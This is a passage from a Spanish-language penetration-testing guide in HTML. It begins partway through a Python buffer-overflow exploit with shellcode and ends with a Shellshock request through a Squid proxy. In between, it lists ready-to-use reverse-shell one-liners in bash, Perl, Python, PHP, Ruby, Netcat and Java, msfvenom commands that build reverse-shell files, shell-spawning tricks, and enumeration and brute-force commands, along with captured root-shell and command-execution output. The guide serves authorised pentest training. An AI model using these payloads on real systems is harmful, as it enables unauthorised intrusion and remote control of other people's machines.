<span class="s2">&quot;</span><span class="se">\xd0\x64\x70\x65\x48\x11\xa1\xa6\xea\x88\x34\x5b\xb8\x19\xce</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x7d\x8c\x95\x1d\xfd</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x11</span><span class="s2">(setup sound &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x00</span><span class="s2">#&quot;</span> 

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 

    <span class="nb">print</span> <span class="s2">&quot;[*] Enviando buffer...&quot;</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">data</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span> <span class="s2">&quot;[*] Payload Enviado!&quot;</span> 
<span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error conectando con el servicio...</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<h1 id="ganando-acceso-al-sistema">Ganando Acceso al Sistema<a class="headerlink" href="#ganando-acceso-al-sistema" title="Permanent link">&para;</a></h1>
<p>Por último, cerramos <strong>edb</strong>, corremos el programa normalmente, enviamos el búffer y previamente estando en escucha desde <strong>Netcat</strong> por el puerto 443, ganamos acceso al sistema:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#nc -nlvp 443</span>
Ncat:<span class="w"> </span>Version<span class="w"> </span><span class="m">7</span>.70<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org/ncat<span class="w"> </span><span class="o">)</span>
Ncat:<span class="w"> </span>Listening<span class="w"> </span>on<span class="w"> </span>:::443
Ncat:<span class="w"> </span>Listening<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0:443
Ncat:<span class="w"> </span>Connection<span class="w"> </span>from<span class="w"> </span><span class="m">192</span>.168.1.81.
Ncat:<span class="w"> </span>Connection<span class="w"> </span>from<span class="w"> </span><span class="m">192</span>.168.1.81:55272.
script<span class="w"> </span>/dev/null<span class="w"> </span>-c<span class="w"> </span>bash
Script<span class="w"> </span>started,<span class="w"> </span>file<span class="w"> </span>is<span class="w"> </span>/dev/null
root@kali:/root#<span class="w"> </span>whoami
whoami
root
root@kali:/root#
</code></pre></div>

<h1 id="pentesting">Pentesting<a class="headerlink" href="#pentesting" title="Permanent link">&para;</a></h1>
<p>En este punto, se detallan técnicas de Pentesting a abordar sobre las máquinas Windows/Linux que se nos presenten.</p>
<h3 id="general">General<a class="headerlink" href="#general" title="Permanent link">&para;</a></h3>
<p>Bajo este apartado se describirán técnicas de enumeración a realizar sobre los Hosts independientemente del sistema operativo / servicio con el que se trate.</p>
<h4 id="port-scanning">Port Scanning<a class="headerlink" href="#port-scanning" title="Permanent link">&para;</a></h4>
<p>Cada uno tiene su forma de hacer la enumeración de puertos/servicios corriendo bajo un sistema. Yo generalmente suelo seguir estos pasos.</p>
<ul>
<li>Escaneo inicial de puertos abiertos sobre el sistema</li>
</ul>
<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-T5<span class="w"> </span>-v<span class="w"> </span>-oG<span class="w"> </span>allPorts<span class="w"> </span>ipHost<span class="w"> </span>-n
</code></pre></div>

<ul>
<li>Enumeración del servicio y versionado para los puertos descubiertos sobre el sistema</li>
</ul>
<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-p<span class="k">$(</span>cat<span class="w"> </span>allPorts<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">&#39;\d{2,5}/open&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="w"> </span><span class="nv">FS</span><span class="o">=</span><span class="s2">&quot;/&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39; &#39;</span><span class="w"> </span><span class="s1">&#39;,&#39;</span><span class="k">)</span><span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>ipHost<span class="w"> </span>-oN<span class="w"> </span>targeted
</code></pre></div>

<p>La razón de hacer esto es que me parece mucho más ágil el poder tener una visual de los puertos abiertos de un primer tirón para el escaneo inicial, así en lo que posteriormente lanzo el profundo de enumeración de servicios con los scripts básicos de enumeración, puedo ir enumerando por mi cuenta los puertos que corren servicios conocidos (HTTP, HTTPS, FTP, ms-sql-s, etc.).</p>
<ul>
<li>En caso de contar con un escaneo inicial lento, suelo aplicar la siguiente variante</li>
</ul>
<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-A<span class="w"> </span>-T4<span class="w"> </span>-v<span class="w"> </span>ipHost<span class="w"> </span>-oN<span class="w"> </span>misc
</code></pre></div>

<p>Este escaneo no engloba todos los puertos, y probablemente nos estemos saltando algunos interesantes que escapen de este escaneo. En tal caso podemos ir englobando rangos de búsqueda a fin de determinar los puertos que están abiertos (Pues lanzando el -p- cuando se demora mucho tiempo nmap suele detener el escaneo haciéndolo incompleto):</p>
<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-p1-10000<span class="w"> </span>--open<span class="w"> </span>-T5<span class="w"> </span>-v<span class="w"> </span>ipHost<span class="w"> </span>-n<span class="w"> </span>-oG<span class="w"> </span>range1-10000
nmap<span class="w"> </span>-p10000-20000<span class="w"> </span>--open<span class="w"> </span>-T5<span class="w"> </span>-v<span class="w"> </span>ipHost<span class="w"> </span>-n<span class="w"> </span>-oG<span class="w"> </span>range10000-20000
nmap<span class="w"> </span>-p20000-30000<span class="w"> </span>--open<span class="w"> </span>-T5<span class="w"> </span>-v<span class="w"> </span>ipHost<span class="w"> </span>-n<span class="w"> </span>-oG<span class="w"> </span>range20000-30000
<span class="w">                        </span>.
<span class="w">                        </span>.
<span class="w">                        </span>.
</code></pre></div>

<p>En caso de figurar un servicio HTTP corriendo bajo un puerto, podemos aprovecharnos del script <strong>http-enum.nse</strong> de nmap para enumerar directorios y archivos del servicio web (Cuenta con un diccionario pequeño pero nos puede servir para tener una visual rápida sobre los recursos alojados):</p>
<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>--script<span class="o">=</span>http-enum.nse<span class="w"> </span>-p80,443,8080<span class="w"> </span>ipHost<span class="w"> </span>-oN<span class="w"> </span>webScan
</code></pre></div>

<ul>
<li>Visualización de categorías para los scripts de nmap</li>
</ul>
<div class="codehilite"><pre><span></span><code>grep<span class="w"> </span>-r<span class="w"> </span>categories<span class="w"> </span>/usr/share/nmap/scripts/*.nse<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">&#39;&quot;.*?&quot;&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
</code></pre></div>

<p>Estas categorías son todas las que nmap posee, pudiendo por ejemplo para un servicio FTP o SMB aplicar las siguientes categorías:</p>
<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-p21,445<span class="w"> </span>--script<span class="o">=</span><span class="s2">&quot;vuln and safe&quot;</span><span class="w"> </span>ipHost<span class="w"> </span>-oN<span class="w"> </span>vulnSafeScan
</code></pre></div>

<p>En cuanto a los <strong>Low Hanging Fruit</strong>, puertos interesantes a buscar para nuestros escaneos iniciales pueden ser los siguientes (Hay muchos más, pero corresponden a servicios que nos pueden garantizar la ejecución de comandos en remoto sobre los sistemas):</p>
<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-p21,1433<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>--open<span class="w"> </span>-T5<span class="w"> </span>-v<span class="w"> </span>-n<span class="w"> </span>-oN<span class="w"> </span>LHF
</code></pre></div>

<p>Sobre el servicio <strong>FTP</strong> resulta interesante comprobar que podamos subir archivos. En caso de contar con un IIS, si vemos que somos capaces de alojar un fichero asp/aspx y apuntar al mismo desde el servicio web, podremos entablar una conexión TCP reversa.</p>
<p>Sobre el servicio <strong>ms-sql-s</strong>, una de las pruebas que suelo utilizar de cabeza es la de realizar una autenticación vía <strong>sqsh</strong> contra el servicio proporcionando las credenciales <strong>sa</strong> de usuario sin contraseña. Puede llegar a pasar que el servicio no se encuentre corriendo sobre el puerto 1433, en ese caso podemos hacer uso de la herramienta <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">mssql.py</a></p>
<h4 id="wfuzz">Wfuzz<a class="headerlink" href="#wfuzz" title="Permanent link">&para;</a></h4>
<p>Aunque también se puede hacer uso de <strong>Dirbuster</strong>, siempre he sido más partidiario de lidiar con <strong>Wfuzz</strong>. La sintaxis general para la búsqueda de directorios que empleo es la siguiente:</p>
<div class="codehilite"><pre><span></span><code>wfuzz<span class="w"> </span>-c<span class="w"> </span>--hc<span class="o">=</span><span class="m">404</span><span class="w"> </span>-z<span class="w"> </span>file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>http://192.168.1.X/FUZZ
</code></pre></div>

<p>En caso de querer recorrer un rango numérico, por ejemplo para un caso práctico donde vemos que contamos con un servicio web desde el cual podemos hacer consultas a otro servicio web, algo que podemos hacer es aprovechar dicha funcionalidad para enumerar puertos internos que corran sobre el sistema desde el cual estamos aplicando las consultas.</p>
<p>Esta parte me recuerda sobre todo a una máquina de HackTheBox, donde figuraba ciertos servicios HTTP corriendo que no eran accesibles desde fuera de la máquina. Con el objetivo de determinar estos puertos, podemos atender a los códigos de estado del lado de la respuesta del servidor, ocultando por ejemplo el código de estado 404:</p>
<div class="codehilite"><pre><span></span><code>wfuzz<span class="w"> </span>-c<span class="w"> </span>--hc<span class="o">=</span><span class="m">404</span><span class="w"> </span>-z<span class="w"> </span>range,1-65535<span class="w"> </span>http://192.168.1.X:8080/request_to<span class="o">=</span>http://127.0.0.1:FUZZ
</code></pre></div>

<p>De esta forma, se nos mostrará únicamente resultados donde se devuelva un código de estado diferente al 404.</p>
<p>De manera alternativa, también podríamos haber aplicado lo siguiente:</p>
<div class="codehilite"><pre><span></span><code>wfuzz<span class="w"> </span>-c<span class="w"> </span>--sc<span class="o">=</span><span class="m">200</span><span class="w"> </span>-z<span class="w"> </span>range,1-65535<span class="w"> </span>http://192.168.1.X:8080/request_to<span class="o">=</span>http://127.0.0.1:FUZZ
</code></pre></div>

<p>Para mostrar peticiones que devuelvan un 200 cómo código de estado. Al igual que el código de estado se pueden jugar con más parámetros de filtro, como los caracteres, el número total de líneas, etc.</p>
<p><strong>Importante:</strong> A la hora de obtener un <strong>Forbidden</strong> en el código de estado de la respuesta del lado del servidor, recomiendo no tirar la toalla... pues a pesar de figurarnos dicha respuesta, podemos seguir enumerando directorios y archivos dentro de dicho directorio, donde tras dar con recursos válidos vemos que estos son visibles desde la web.</p>
<p>Para tener un caso práctico, supongamos que tenemos un directorio <strong>/design</strong> que nos devuelve un Forbidden. Algo que podemos hacer es configurar una enumeración de doble Payload desde wfuzz a fin de descubrir recursos existentes bajo dicho directorio.</p>
<p>Para ello, nos creamos un fichero <em>extensions.txt</em> con el siguiente contenido:</p>
<div class="codehilite"><pre><span></span><code>php
txt
html
xml
cgi
</code></pre></div>

<p>Posteriormente, hacemos uso de Wfuzz siguiendo la siguiente sintaxis:</p>
<p><code>wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z file,extensions http://192.168.1.X/design/FUZZ.FUZ2Z</code></p>
<p>De esta forma, estaremos para cada una de las líneas del payload principal comprobando las extensiones especificadas sobre el segundo payload.</p>
<h4 id="nikto">Nikto<a class="headerlink" href="#nikto" title="Permanent link">&para;</a></h4>
<p>Sinceramente no he llegado a profundizar mucho sobre esta herramienta, pero dado que forma parte de una de las herramientas de automatización que admiten en el examen y a veces devuelve maravillas... detallo su uso:</p>
<p><code>nikto -h http://192.168.1.X</code></p>
<h4 id="snmp-enumeration">SNMP Enumeration<a class="headerlink" href="#snmp-enumeration" title="Permanent link">&para;</a></h4>
<p>Aunque se trata de un servicio que corre bajo un puerto por <strong>UDP</strong>, parece inofensivo pero la enumeración sobre dicho servicio nos puede permitir enumerar más de la cuenta a nivel de sistema para saber qué software corren, así como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.</p>
<p>Para detectar si el servicio está operativo:</p>
<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-p161<span class="w"> </span>-sU<span class="w"> </span>--open<span class="w"> </span>-T5<span class="w"> </span>-v<span class="w"> </span>-n<span class="w"> </span><span class="m">192</span>.168.1.X
</code></pre></div>

<p>En caso de estar abierto, lo primero será averiguar la <em>Community String</em>. Generalmente suele ser <strong>public</strong>, pero por si acaso, nos montamos un ligero diccionario:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>s4vitar@parrot<span class="o">]</span>─<span class="o">[</span>~/Desktop<span class="o">]</span>
└──╼<span class="w"> </span><span class="nv">$echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;public\nprivate\nmanager&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>community.txt
┌─<span class="o">[</span>s4vitar@parrot<span class="o">]</span>─<span class="o">[</span>~/Desktop<span class="o">]</span>
└──╼<span class="w"> </span><span class="nv">$cat</span><span class="w"> </span>community.txt<span class="w"> </span>
public
private
manager
</code></pre></div>

<p>Una vez creado, utilizamos <strong>onesixtyone</strong> para bruteforcear la Community String del servicio:</p>
<div class="codehilite"><pre><span></span><code>onesixtyone<span class="w"> </span>-c<span class="w"> </span>community.txt<span class="w"> </span>-i<span class="w"> </span>ficheroIPS.txt
Scanning<span class="w"> </span><span class="m">2</span><span class="w"> </span>hosts,<span class="w"> </span><span class="m">3</span><span class="w"> </span>communities
<span class="m">10</span>.11.1.X<span class="w"> </span><span class="o">[</span>public<span class="o">]</span><span class="w"> </span>Linux<span class="w"> </span>example<span class="w"> </span><span class="m">2</span>.4.18-3<span class="w"> </span><span class="c1">#1 Thu Apr 18 07:37:53 EDT 2002 i686</span>
<span class="m">10</span>.11.1.Y<span class="w"> </span><span class="o">[</span>public<span class="o">]</span><span class="w"> </span>Linux<span class="w"> </span>example<span class="w"> </span><span class="m">2</span>.4.20-8<span class="w"> </span><span class="c1">#1 Thu Mar 13 17:54:28 EST 2003 i686</span>
</code></pre></div>

<p>Con esto, tras ver que la Community String es <strong>public</strong>, consideramos los siguientes valores MIB:</p>
<div class="codehilite"><pre><span></span><code><span class="m">1</span>.3.6.1.2.1.25.1.6.0<span class="w"> </span>System<span class="w"> </span>Processes
<span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w"> </span>Running<span class="w"> </span>Programs
<span class="m">1</span>.3.6.1.2.1.25.4.2.1.4<span class="w"> </span>Processes<span class="w"> </span>Path
<span class="m">1</span>.3.6.1.2.1.25.2.3.1.4<span class="w"> </span>Storage<span class="w"> </span>Units
<span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w"> </span>Software<span class="w"> </span>Name
<span class="m">1</span>.3.6.1.4.1.77.1.2.25<span class="w"> </span>User<span class="w"> </span>Accounts
<span class="m">1</span>.3.6.1.2.1.6.13.1.3<span class="w"> </span>TCP<span class="w"> </span>Local<span class="w"> </span>Ports
</code></pre></div>

<p>Hay muchos más... pero a modo de ejemplo son los más significativos. Suponiendo que quisiéramos saber qué procesos corre el sistema, aplicaríamos el siguiente comando desde <strong>snmpwalk</strong>:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="m">10</span>.11.1.X<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.1.6.0
</code></pre></div>

<p>Inmediatamente, obtendremos una lista de los procesos que corren bajo el sistema.</p>
<p>En caso de querer aplicar un análisis exhaustivo sin especificación de valor <strong>MIB</strong>, aplicamos el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="m">10</span>.11.1.X
</code></pre></div>

<p>Y seguidamente, se nos listará montón de información relevante de la máquina. Aunque parezca tontería, hay ocasiones en las que gracias a ver la versión de un servicio en concreto a través del <strong>SNMP</strong>, he podido explotar una vulnerabilidad que jamás habría podido encontrar desde fuera, por lo que lo considero un servicio fundamental a enumerar.</p>
<h4 id="reverse-shell">Reverse Shell<a class="headerlink" href="#reverse-shell" title="Permanent link">&para;</a></h4>
<p>Un paso fundamental a la hora de logar <strong>RCE</strong> es tener controlados los tipos de conexiones reversas que podemos entablar en distintos lenguajes. Adjunto por aquí un listado de las más utilizadas:</p>
<p><strong>Bash</strong></p>
<div class="codehilite"><pre><span></span><code>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.0.0.1/8080<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
</code></pre></div>

<p><strong>Perl</strong></p>
<div class="codehilite"><pre><span></span><code>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
</code></pre></div>

<p><strong>Python</strong></p>
<div class="codehilite"><pre><span></span><code>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</code></pre></div>

<p><strong>PHP</strong></p>
<div class="codehilite"><pre><span></span><code>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
</code></pre></div>

<p><strong>Ruby</strong></p>
<div class="codehilite"><pre><span></span><code>ruby<span class="w"> </span>-rsocket<span class="w"> </span>-e<span class="s1">&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span>
</code></pre></div>

<p><strong>Netcat</strong></p>
<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">1234</span>
</code></pre></div>

<p><strong>Netcat (Wrong Version)</strong></p>
<div class="codehilite"><pre><span></span><code>rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">1234</span><span class="w"> </span>&gt;/tmp/f
</code></pre></div>

<p><strong>Java</strong></p>
<div class="codehilite"><pre><span></span><code><span class="nv">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Runtime.getRuntime<span class="o">()</span>
<span class="nv">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>r.exec<span class="o">([</span><span class="s2">&quot;/bin/bash&quot;</span>,<span class="s2">&quot;-c&quot;</span>,<span class="s2">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span><span class="w"> </span>as<span class="w"> </span>String<span class="o">[])</span>
p.waitFor<span class="o">()</span>
</code></pre></div>

<p>Así mismo, podemos hacer uso de Metasploit para la creación de nuestros archivos maliciosos:</p>
<p><strong>PHP (Metasploit)</strong></p>
<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>php/meterpreter_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.101<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span>&gt;<span class="w"> </span>shell.php
</code></pre></div>

<p><strong>ASP (No Metasploit)</strong></p>
<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.101<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>asp<span class="w"> </span>&gt;<span class="w"> </span>shell.asp
</code></pre></div>

<p><strong>WAR (Sesión vía Netcat)</strong></p>
<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>java/jsp_shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.101<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>war<span class="w"> </span>&gt;<span class="w"> </span>shell.war
</code></pre></div>

<p><strong>JSP (Sesión vía Netcat)</strong></p>
<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>java/jsp_shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.101<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span>&gt;<span class="w"> </span>shell.jsp
</code></pre></div>

<h4 id="spawning-a-tty-shell">Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Permanent link">&para;</a></h4>
<p>Aunque en el apartado de <strong>Tratamiento de la TTY</strong> en la sección de Pentesting para Linux, detallo una técnica para mejorar y construir una Shell totalmente interactiva, sí que es cierto que hay varias formas de hacer un spawning de la pseudo-consola. Detallo a continuación algunas de ellas:</p>
<ul>
<li>python -c 'import pty; pty.spawn("/bin/sh")'</li>
<li>echo os.system('/bin/bash') </li>
<li>/bin/sh -i</li>
<li>perl -e 'exec "/bin/sh";'</li>
<li>perl: exec "/bin/sh";</li>
<li>ruby: exec "/bin/sh"</li>
<li>lua: os.execute('/bin/sh')</li>
<li>exec "/bin/sh" (Desde IRB)</li>
<li>:!bash (Desde vi)</li>
<li>:set shell=/bin/bash:shell (Desde vi)</li>
<li>!sh (Desde nmap)</li>
<li>find /etc/passwd -exec /bin/bash \;</li>
</ul>
<h4 id="compilado-de-exploits-para-windows">Compilado de Exploits para Windows<a class="headerlink" href="#compilado-de-exploits-para-windows" title="Permanent link">&para;</a></h4>
<p>Desde Linux, a la hora de compilar algunos de los exploits que figuren en <strong>Searchsploit</strong> (generalmente en C), aplicaremos el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>i686-w64-mingw32-gcc<span class="w"> </span>exploit.c<span class="w"> </span>-o<span class="w"> </span>exploit
</code></pre></div>

<p>Para máquinas Windows de 32 bits, aplicamos el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>i686-w64-mingw32-gcc<span class="w"> </span><span class="m">40564</span>.c<span class="w"> </span>-o<span class="w"> </span><span class="m">40564</span><span class="w"> </span>-lws2_32
</code></pre></div>

<h4 id="squid-proxy">Squid Proxy<a class="headerlink" href="#squid-proxy" title="Permanent link">&para;</a></h4>
<p>Alguna que otra máquina me he encontrado con esta novedad (tampoco es tan moderno su uso). Una buena máquina para practicar el concepto es la máquina <strong>SickOS 1.1</strong> de VulnHub.</p>
<p>La idea es la siguiente, presento el reporte de un escaneo a modo de ejemplo:</p>
<div class="codehilite"><pre><span></span><code>TCP:<span class="w"> </span><span class="m">22</span><span class="w">     </span>SSH<span class="w">  </span>OpenSSH<span class="w"> </span><span class="m">5</span>.9p1<span class="w"> </span>Debian<span class="w"> </span>5ubuntu1.1<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>

TCP:<span class="w"> </span><span class="m">3128</span><span class="w">   </span>HTTP-Proxy<span class="w">  </span>Squid<span class="w"> </span>http<span class="w"> </span>proxy<span class="w"> </span><span class="m">3</span>.1.19
</code></pre></div>

<p>Como vemos, sólo figuran esos 2 puertos, sin embargo... el uso del <em>Squid</em> nos puede servir para descubrir un par de puertos más. <strong>Squid</strong> no es más que un servidor <em>proxy</em> para web con caché. </p>
<p>Aunque orientado principalmente a HTTP y HTTPS, soporta también otros protocolos como FTP e incluso Gopher. De entre algunas de las funcionalidades que esta utilidad tiene, destaca:</p>
<p><strong>Proxy con caché de HTTP, FTP, y otros protocolos de internet</strong></p>
<p>Squid proporciona un servicio de proxy que soporta peticiones HTTP, HTTPS y FTP a equipos que necesiten acceder a internet y a su vez provee la funcionalidad de caché especializado en el cual almacena de forma local las páginas consultadas recientemente por los usuarios.</p>
<p>Tan interesante resulta la utilidad que hasta <strong>Metasploit</strong> cuenta con su propio módulo de enumeración de SQUID (<strong>auxiliary/scanner/http/squid_pivot_scanning</strong>), desde donde podemos descubrir nuevos puertos que figuren abiertos.</p>
<p>Podemos configurar un escaneo desde <strong>nikto</strong> para que aproveche dicho Squid proxy, esto hace que en caso de contar con un servicio web por el puerto 80 podamos obtener cierta información relevante sobre el mismo:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>nikto<span class="w"> </span>-h<span class="w"> </span>direccionIP<span class="w"> </span>-useproxy<span class="w"> </span>http://direccionIP:puerto
</code></pre></div>

<p>Algo interesante es aprovechar la configuración de Firefox para desde la pestaña '<em>Network</em>', añadir un nuevo '<em>Manual proxy configuration</em>', el cual como campo <strong>HTTP Proxy</strong> disponga la IP del equipo y como puerto el que figure como servicio <strong>Squid Proxy</strong>. Una vez hecho, con acceder directamente a la IP, si esta cuenta con un servicio web por el puerto convencional la veremos directamente desde el navegador.</p>
<p>Las consultas las podemos realizar también desde <strong>curl</strong>, empleando para ello una sintaxis como la que se define a continuación:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>curl<span class="w"> </span>--proxy<span class="w"> </span>ip:puerto<span class="w"> </span>http://ip/cgi-bin/status<span class="w"> </span><span class="c1"># A modo de ejemplo</span>
</code></pre></div>

<p>Suponiendo que la web posteriormente es vulnerable a un ataque <strong>ShellShock</strong>, podríamos realizar la siguiente petición para ejecutar comandos sobre el sistema:</p>
<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>--proxy<span class="w"> </span>ip:puerto<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>http://ip/cgi-bin/status<span class="w"> </span><span class="se">\ </span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Referer: () { test;}; echo &#39;Content-Type: text/plain&#39;; echo; echo; /usr/bin/id; exit&quot;</span>
</code></pre></div>

<p>Obteniendo la siguiente respuesta del lado del servidor:</p>
<div class="codehilite"><pre><span></span><code>*<span class="w">   </span>Trying<span class="w"> </span>ip...
*<span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span>ip<span class="w"> </span><span class="o">(</span>ip<span class="o">)</span><span class="w"> </span>port<span class="w"> </span>puerto<span class="w"> </span><span class="o">(</span><span class="c1">#0)</span>
*<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0,<span class="w"> </span>assume<span class="w"> </span>close<span class="w"> </span>after<span class="w"> </span>body
<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
